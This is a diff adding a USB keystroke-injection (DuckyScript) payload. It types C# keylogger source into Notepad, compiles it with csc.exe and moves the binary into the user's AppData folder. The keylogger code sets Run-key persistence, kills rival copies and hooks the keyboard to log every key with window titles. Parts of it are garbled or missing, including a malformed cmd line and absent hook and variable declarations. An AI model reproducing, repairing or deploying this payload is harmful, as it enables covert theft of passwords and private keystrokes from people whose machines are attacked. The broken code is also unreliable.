@@ -1,0 +1,257 @@
+REM Author: SerieuxBlack
+REM Open Run dialog
+DELAY 512
+WINDOWS r
+DELAY 512
+STRING notepad
+ENTER
+DELAY 512
+STRING using System;
+ENTER
+STRING using System.Diagnostics;
+ENTER
+STRING using System.IO;
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+STRING using System.Text;
+ENTER
+
+STRING namespace Keyllama
+ENTER
+STRING {
+ENTER
+STRING     public static class Program
+ENTER
+STRING     {
+ENTER
+STRING         private static readonly string logLoc = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\srsBLACK";
+ENTER
+STRING         private static string CurrentActiveWindowTitle;
+ENTER
+STRING         public static class Settings
+ENTER
+STRING         {
+ENTER
+STRING             public static string InstallFolder = "FIND";
+ENTER
+STRING             public static string InstallFile = "scribe.exe";
+ENTER
+STRING         }
+ENTER
+STRING         public static void Install()
+ENTER
+STRING         {
+ENTER
+STRING             try
+ENTER
+STRING             {
+ENTER
+STRING                 var installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
+ENTER
+STRING                 var currentProcess = Process.GetCurrentProcess().MainModule.FileName;
+ENTER
+STRING                 if (currentProcess != installPath.FullName)
+ENTER
+STRING                 {
+ENTER
+STRING                     foreach (Process process in Process.GetProcesses())
+ENTER
+STRING                     {
+ENTER
+STRING                         try
+ENTER
+STRING                         {
+ENTER
+STRING                             if (process.MainModule.FileName == installPath.FullName)
+ENTER
+STRING                                 process.Kill();
+ENTER
+STRING                         }
+ENTER
+STRING                         catch { }
+ENTER
+STRING                     }
+ENTER
+STRING                     if (Alpha())
+ENTER
+STRING                     {
+ENTER
+STRING                         Process.Start(new ProcessStartInfo("cmd" & exit")
+ENTER
+STRING                         {
+ENTER
+STRING                             WindowStyle = ProcessWindowStyle.Hidden,
+ENTER
+STRING                             CreateNoWindow = true
+ENTER
+STRING                         });
+ENTER
+STRING                     }
+ENTER
+STRING                     else
+ENTER
+STRING                     {
+ENTER
+STRING                         using (var key = Registry.CurrentUser.OpenSubKey(@"Run\", true))
+ENTER
+STRING                         {
+ENTER
+STRING                             key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");
+ENTER
+STRING                         }
+ENTER
+STRING                     }
+ENTER
+STRING                     if (File.Exists(installPath.FullName))
+ENTER
+STRING                     {
+ENTER
+STRING                         File.Delete(installPath.FullName);
+ENTER
+STRING                         Thread.Sleep(1000);
+ENTER
+STRING                     }
+ENTER
+
+ENTER
+STRING                 {
+ENTER
+STRING                     switch (((Keys)vkCode).ToString())
+ENTER
+STRING                     {
+ENTER
+STRING                         case "Space": currentKey = "[SPACE]"; break;
+ENTER
+STRING                         case "Return": currentKey = "[ENTER]"; break;
+ENTER
+STRING                         case "Escape": currentKey = "[ESC]"; break;
+ENTER
+STRING                         case "LControlKey":
+ENTER
+STRING                         case "RControlKey": currentKey = "[CTRL]"; break;
+ENTER
+STRING                         case "RShiftKey":
+ENTER
+STRING                         case "LShiftKey": currentKey = "[Shift]"; break;
+ENTER
+STRING                         case "Back": currentKey = "[Back]"; break;
+ENTER
+STRING                         case "LWin": currentKey = "[WIN]"; break;
+ENTER
+STRING                         case "Tab": currentKey = "[Tab]"; break;
+ENTER
+STRING                         case "Capital": currentKey = capsLock ? "[CAPSLOCK: OFF]" : "[CAPSLOCK: ON]"; break;
+ENTER
+STRING                     }
+ENTER
+STRING                 }
+ENTER
+ENTER
+STRING                     else
+ENTER
+STRING                     {
+ENTER
+STRING                         sw.WriteLine();
+ENTER
+STRING                         sw.WriteLine("###  " + ActiveWinTitle() + " ###");
+ENTER
+STRING                         sw.Write(currentKey);
+ENTER
+STRING                     }
+ENTER
+STRING                 }
+ENTER
+STRING             }
+ENTER
+STRING             return CallNextHookEx(_hookID, nCode, wParam, lParam);
+ENTER
+STRING         }
+ENTER
+STRING         private static IntPtr SetHook(LowLevelKeyboardProc proc) => SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(Process.GetCurrentProcess().ProcessName), 0);
+ENTER
+STRING         public static bool Alpha() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+ENTER
+STRING         public static void Main()
+ENTER
+STRING         {
+ENTER
+STRING             Install();
+ENTER
+STRING             _hookID = SetHook(_proc);
+ENTER
+STRING             Application.Run();
+ENTER
+STRING         }
+ENTER
+STRING         #region "Hooks & Native Methods"
+ENTER
+STRING         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+ENTER
+STRING         private static extern IntPtr GetModuleHandle(string lpModuleName);
+ENTER
+STRING         private static int WHKEYBOARDLL = 13;
+ENTER
+STRING         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+ENTER
+STRING         [DllImport("user32.dll")]
+ENTER
+STRING         static extern IntPtr GetForegroundWindow();
+ENTER
+STRING         [DllImport("user32.dll", SetLastError = true)]
+ENTER
+STRING         static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+ENTER
+STRING         static extern IntPtr GetKeyboardLayout(uint idThread);
+ENTER
+STRING         [DllImport("user32.dll")]
+ENTER
+STRING         static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+ENTER
+STRING         [DllImport("user32.dll")]
+ENTER
+STRING         static extern uint MapVirtualKey(uint uCode, uint uMapType);
+ENTER
+STRING         #endregion
+ENTER
+STRING     }
+ENTER
+STRING }
+ENTER
+REM Save the file with a unique name in the default directory
+DELAY 512
+CTRL s
+DELAY 512
+STRING Keyllama.cs
+ENTER
+DELAY 512
+ALT F4
+DELAY 512
+REM Open PowerShell
+WINDOWS r
+DELAY 512
+STRING powershell
+ENTER
+DELAY 999
+REM Execute a command to find the file recursively
+STRING $fp = Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter Keyllama.cs | Select-Object -ExpandProperty FullName -First 1
+ENTER
+DELAY 999
+REM Display the contents of the file
+STRING Get-Content $fp
+ENTER
+REM Compile Time >:)
+STRING & 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe' /out:Yahvehcaller.exe $fp
+ENTER
+DELAY 999
+REM Identify the path of Yahvehcaller.exe and move it
+STRING $erieux = Join-Path (Split-Path $fp) 'Yahvehcaller.exe'
+ENTER
+STRING $BLACK = [Environment]::GetFolderPath([Environment+SpecialFolder]::ApplicationData)
+ENTER
+STRING Move-Item $erieux $BLACK
+ENTER
+DELAY 999
+REM Execute
+REM Start-Process -FilePath $BLACK -WindowStyle Hidden
+REM [ENTER]
